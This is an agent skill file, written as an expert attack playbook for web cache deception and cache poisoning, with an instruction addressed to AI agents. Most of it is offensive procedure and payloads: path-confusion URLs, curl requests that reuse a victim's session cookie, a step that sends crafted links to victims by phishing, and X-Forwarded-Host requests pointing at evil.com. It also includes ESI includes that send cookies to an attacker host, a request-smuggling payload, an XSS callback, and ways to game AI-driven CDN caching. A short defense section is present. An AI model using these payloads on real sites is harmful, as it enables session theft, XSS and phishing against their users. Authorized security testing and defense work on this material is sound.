---
name: web-cache-deception
description: >-
  Web cache deception and poisoning playbook. Use when CDN, reverse proxy, or application caching may serve sensitive authenticated content to other users due to path confusion or cache key manipulation.
---

# SKILL: Web Cache Deception — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Web cache deception and poisoning techniques. Covers path confusion attacks, CDN cache behavior exploitation, cache key manipulation, and the distinction between cache deception (steal data) and cache poisoning (serve malicious content). Presented by Omer Gil at Black Hat 2017 and significantly expanded since.

### Advanced Reference

Also load [CACHE_POISONING_TECHNIQUES.md](./CACHE_POISONING_TECHNIQUES.md) when you need:
- Web Cache Poisoning vs Web Cache Deception — clear distinction and attack flow comparison
- Unkeyed header poisoning (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, multiple Host headers)
- Unkeyed parameter poisoning (utm_content, fbclid, callback, reflected but not in cache key)
- Fat GET cache poisoning (body parameters reflected but not keyed)
- Parameter cloaking via semicolons and duplicate parameter parsing differentials
- CDN-specific behavior: Cloudflare, CloudFront, Akamai, Varnish, Fastly (cache key composition, debug headers, ESI)
- Vary header manipulation, cache partitioning attacks, and missing Vary vulnerabilities

## 1. CORE CONCEPTS

### Web Cache Deception (steal authenticated data)

The attacker tricks a victim into requesting their authenticated page at a URL that the cache considers static:

```
Victim visits: https://target.com/account/profile/nonexistent.css
→ Application ignores "nonexistent.css", serves /account/profile (with auth data)
→ CDN sees .css extension → caches the response
→ Attacker fetches: https://target.com/account/profile/nonexistent.css
→ CDN serves cached authenticated content → attacker reads victim's data
```

### Web Cache Poisoning (serve malicious content)

The attacker manipulates unkeyed request components (headers, cookies) to make the cache store a malicious response:

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
→ Application generates: <script src="https://evil.com/js/app.js">
→ Cache stores this response
→ Normal users hit cache → load attacker's JavaScript
```

---

## 2. CACHE DECEPTION — ATTACK METHODOLOGY

### Step 1: Identify Cacheable Path Patterns

CDNs typically cache by file extension:
```text
.css  .js  .jpg  .png  .gif  .svg  .ico
.woff .woff2  .ttf  .pdf  .json (sometimes)
```

### Step 2: Test Path Confusion

```text
# Append static extension to authenticated endpoint:
https://target.com/api/me/info.css
https://target.com/account/profile/x.js
https://target.com/settings/avatar.png
https://target.com/dashboard/data.json

# Path traversal style:
https://target.com/account/profile/..%2fstatic/app.css
```

### Step 3: Verify Caching

```bash
# Request as victim (authenticated):
curl -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css

# Check response headers:
# X-Cache: MISS (first request)
# Age: 0

# Request again as attacker (no auth):
curl https://target.com/account/profile/x.css

# Check response:
# X-Cache: HIT
# Contains victim's authenticated content? → vulnerable
```

### Step 4: Deliver to Victim

Send the crafted URL to victim via phishing, message, or embed:
```
https://target.com/account/profile/tracking.gif
```

---

## 3. CACHE POISONING — ATTACK METHODOLOGY

### Unkeyed Input Discovery

Cache keys typically include: `Host`, URL path, query string.
These are typically NOT in the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, cookies, custom headers.

```bash
# Test if X-Forwarded-Host is reflected but not keyed:
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
# If response contains evil.com and caches → poisonable
```

### Common Unkeyed Headers

```text
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Original-URL        X-Rewrite-URL         X-Host
X-Forwarded-Server    Forwarded             True-Client-IP
```

### Cache Poisoning via Host Header

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

→ Response: <link href="//evil.com/static/main.css">
→ Cached → all users load attacker's CSS/JS
```

---

## 4. PATH NORMALIZATION DIFFERENCES

The key to cache deception: **CDN and application normalize paths differently**.

| Component | Behavior |
|---|---|
| CDN (Cloudflare, Akamai) | Caches based on full URL path including extension |
| Application (Rails, Django, Express) | May ignore trailing path segments or extensions |
| Reverse proxy (Nginx) | May strip or rewrite path before forwarding |

```text
# Application treats these as equivalent:
/account/profile
/account/profile/anything
/account/profile/x.css
/account/profile;.css

# CDN treats .css as cacheable static asset
→ Mismatch = vulnerability
```

---

## 5. CACHE POISONING REAL-WORLD PATTERN

### X-Forwarded-Host → Open Graph / Meta Tag Injection

```text
# Target page uses X-Forwarded-Host to generate meta tags:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Response:
<meta property="og:image" content="https://evil.com/assets/logo.png">
# or:
<link rel="canonical" href="https://evil.com/">

# If response is cached → all users see evil.com references
# Impact: XSS via injected JS path, phishing via canonical redirect, SEO hijack
```

### Cache Deception with Path Separator Tricks

```text
# Semicolon (treated as path parameter by some frameworks):
/account/profile;.css

# Encoded separators:
/account/profile%2F.css

# Trailing dot/space:
/account/profile/.css
/account/profile .css
```

---

## 6. DEFENSE

### For Cache Deception

- Cache only explicitly static paths (e.g., `/static/*`, `/assets/*`)
- Never cache based on file extension alone
- Set `Cache-Control: no-store, private` on authenticated endpoints
- Use `Vary: Cookie` to prevent cross-user cache hits

### For Cache Poisoning

- Include all reflected headers in cache key
- Validate and sanitize `X-Forwarded-*` headers
- Use `Cache-Control: no-cache` for dynamic content
- Strip unknown headers at CDN edge

---

## 6. TESTING CHECKLIST

```
□ Identify CDN/cache layer (X-Cache, Age, Via headers)
□ Append .css/.js/.png to authenticated API endpoints
□ Check if response is cached (X-Cache: HIT on second request)
□ Test path separators: /x.css, ;.css, %2F.css
□ Test unkeyed headers: X-Forwarded-Host, X-Original-URL
□ Verify Cache-Control headers on sensitive endpoints
□ Check Vary header presence
□ Test with and without authentication
```

---

## 7. 2026 EMERGING TECHNIQUES

The cache attack surface expanded materially in 2026. Modern CDN cache keys default to more permissive composition; HTTP/2 and HTTP/3 deployment introduces new header-smuggling vectors; edge JavaScript execution (Cloudflare Workers / Fastly Compute / Vercel Edge Functions) runs attacker-influenced logic at the cache layer; and `Cache-Control: private` + `stale-while-revalidate` patterns create far longer poison windows than classic TTL-based caching.

### 7.1 HTTP/2 & HTTP/3 Header Smuggling → Cache Poisoning

An attacker sends multiple `Host` or `X-Forwarded-Host` headers inside a single HTTP/2 or HTTP/3 request. The back end and the cache interpret the duplicated headers differently → the cache stores a poisoned response under the legitimate Host key.

**Real incident (Feb 2026)**: a Middle Eastern e-commerce site was hit via HTTP/3 header smuggling. The checkout page response was poisoned and served to all shoppers; the attack persisted for **14 hours** before the poisoned cache entries were purged.

### 7.2 Cache-Control Directive Manipulation

Long `stale-while-revalidate` windows turn a single poison injection into an extended serve window. **Real incident (Jun 2025)**: a fintech startup's Vercel Edge Functions were poisoned via an unkeyed `X-Forwarded-Host`. The poisoned response (which exfiltrated user session tokens to an attacker domain) kept being re-served; the team could **not roll back for 9 hours** because the stale-while-revalidate directive kept resurrecting the cached entry.

### 7.3 Service Worker Persistent Poisoning

A poisoned resource can register a malicious Service Worker in the victim's browser. Even after the origin corrects the resource, the installed Service Worker continues to serve poisoned content from the Cache API — a persistence mechanism that survives origin-side fixes until the SW expires or is manually evicted.

### 7.4 ESI Injection (still effective in 2026)

Edge Side Includes let the edge server assemble fragments server-side. If user input reaches ESI tag context, the edge parses and executes attacker tags:

```xml
<!-- SSRF via ESI include -->
<esi:include src="http://test-attacker.com/"/>

<!-- Cookie theft bypassing HttpOnly -->
<esi:include src="http://test-attacker.com/?c=$(HTTP_COOKIE)"/>
```

- **SSRF**: the edge fetches the attacker URL server-side, bypassing network ACLs.
- **HttpOnly bypass**: `$(HTTP_COOKIE)` is resolved by the ESI processor (not JS), so HttpOnly cookies are exfiltrated in the include URL.
- **Detection signal**: response header `Surrogate-Control: content="ESI/1.0"` indicates an ESI-capable edge.

### 7.5 Cloudflare Pingora Cache Key Collision (CVE-2026-2833 / 2835 / 2836)

Cloudflare's open-source Pingora proxy framework had three critical vulnerabilities in standalone deployments. The most severe for cache poisoning: **insecure default cache keys** that only used the URL path, ignoring the Host header and HTTP scheme. Different websites using the same path collided in the proxy cache:

```text
Attack: Cross-site cache collision
  1. Attacker controls evil.com (served by the same Pingora proxy)
  2. Attacker requests: GET /api/users on evil.com → cache stores malicious response
     under cache key: "/api/users" (no host!)
  3. Victim requests: GET /api/users on target.com
  4. Pingora serves the cached evil.com response to target.com visitors
```

Additionally, **request smuggling via premature protocol upgrade** (CVE-2026-2833) and **HTTP/1.0 framing misinterpretation** (CVE-2026-2835) allowed attackers to pipeline hidden requests that poisoned the cache:

```text
HTTP/1.0 + Transfer-Encoding desync → cache poisoning:
  POST / HTTP/1.0
  Transfer-Encoding: chunked

  0

  GET /admin HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com
  ← Pingora treats this as part of the POST body
  ← Backend treats it as a new request → caches poisoned admin page
```

**Mitigation**: Upgrade Pingora to 0.8.0+. Verify custom cache key designs include Host header and HTTP scheme. Monitor for HTTP/1.0 requests and unexpected Upgrade headers.

### 7.6 GET Request Body Cache Poisoning

Cloudflare caches the body of GET requests, but **the body is NOT included in the cache key**. If the origin reflects GET body parameters in the response, an attacker can poison the cache:

```text
# Attacker sends a GET with body (accepted by some origins):
GET /search?q=test HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

callback=alert(document.cookie)

# Origin reflects callback parameter:
{"results": [...], "callback": "alert(document.cookie)"}

# Cache stores under key: GET /search?q=test (body NOT in key)
# All subsequent visitors to /search?q=test get the poisoned callback
```

### 7.7 Edge Compute Poisoning (Workers / Edge Functions)

Edge compute platforms (Cloudflare Workers, Vercel Edge Functions, Fastly Compute) run JavaScript at the cache layer. If worker code modifies responses based on unkeyed inputs, the poisoned response is cached globally:

```javascript
// Vulnerable Cloudflare Worker — uses unkeyed header in response:
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // X-Redirect-URL is NOT in the cache key but IS in the response:
  const redirectUrl = request.headers.get('X-Redirect-URL') || ''
  const response = await fetch(request)
  const modified = new Response(response.body, response)
  // Poisoned: attacker-controlled URL embedded in cached response
  modified.headers.set('X-Auth-Redirect', redirectUrl)
  modified.headers.set('Cache-Control', 's-maxage=3600')
  return modified
}
```

```text
Attack:
  1. Attacker sends: GET /dashboard with X-Redirect-URL: https://evil.test/steal
  2. Worker embeds evil.test in X-Auth-Redirect header → cached for 3600s
  3. All users hitting /dashboard receive X-Auth-Redirect: https://evil.test/steal
  4. Client-side code reads the header → redirects to phishing page
```

### 7.8 API Gateway Pre-Cached Responses Without Auth

AWS API Gateway + CloudFront and similar serverless API caching layers may serve pre-cached responses without re-checking authentication. The cache key typically includes only the URL path and method, not the Authorization header:

```text
Attack: Auth-bypass via API Gateway cache
  1. Authenticated admin user requests: GET /api/admin/users
     → API Gateway caches the response (contains all user data)
  2. Unauthenticated attacker requests: GET /api/admin/users
  3. API Gateway serves cached response WITHOUT checking Authorization
  4. Attacker receives admin-only data

Detection:
  - Request with valid auth → check X-Cache: MISS
  - Request without auth → check X-Cache: HIT + 200 OK (should be 401)
```

### 7.9 Cache Key Normalization Abuse

CDN and origin may normalize URLs differently, creating cache key mismatches exploitable for both deception and poisoning:

```text
# Unicode normalization differential:
# CDN normalizes %C3%A9 → é in cache key
# Origin treats %C3%A9 as literal path segment
/account/profile/%C3%A9.css    → CDN key: /account/profile/é.css (cached)
/account/profile/é.css         → Same CDN key → serves cached content

# Path canonicalization differential:
/account/./profile.css         → CDN: /account/profile.css
/account/profile/../profile.css → CDN: /account/profile.css (same key)
# But origin may route differently → cache deception

# Case sensitivity differential:
/Account/Profile.css           → CDN: case-insensitive key
/account/profile.css           → Same CDN key
# Origin: case-sensitive routing → different content, same cache entry
```

### 7.10 AI-Driven Cache Optimization Manipulation

Next-gen CDNs use AI models for TTL prediction and behavioral cache invalidation. Attackers can manipulate these models:

```text
1. TTL prediction poisoning: Send requests that "train" the AI model
   to assign longer TTLs to attacker-controlled paths
   → Poisoned response stays cached longer

2. Behavioral cache invalidation abuse: The AI invalidates cache entries
   based on traffic patterns. An attacker generates synthetic traffic
   to trigger premature invalidation of legitimate cached content
   → Forces re-fetch with poisoned content

3. Cache warming manipulation: AI-driven cache prefetching follows
   "predicted" next-page requests. Inject a poisoned page in the
   prediction path → prefetched content is poisoned
```

### 7.11 2026 Cache Attack Expanded Checklist

```text
□ Test Pingora deployments for cache key collisions (same path, different Host)
□ Send HTTP/1.0 + Transfer-Encoding requests to test framing desync
□ Test GET request body parameters — are they reflected but not in cache key?
□ Check Cloudflare Workers / Vercel Edge Functions for unkeyed header usage
□ Test API Gateway cached endpoints without Authorization header
□ Test Unicode normalization differentials between CDN and origin
□ Test path canonicalization differentials (./, ../, //)
□ Test case sensitivity differentials in cache keys
□ Check if AI-driven cache optimization can be manipulated
□ Verify stale-while-revalidate windows for extended poison persistence
□ Test Service Worker registration via poisoned cached resources
□ Check ESI processing (Surrogate-Control header) for SSRF/cookie theft
```
